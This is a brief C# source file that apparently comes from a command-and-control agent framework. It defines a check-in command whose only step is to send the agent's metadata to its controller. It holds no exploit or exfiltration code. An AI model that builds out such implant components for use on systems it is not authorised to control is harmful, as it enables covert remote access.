using Agent.Models;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class CheckinCommand : AgentCommand
    {
        public override CommandId Command => CommandId.CheckIn;

        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            await context.Agent.SendMetaData();
        }
    }
}
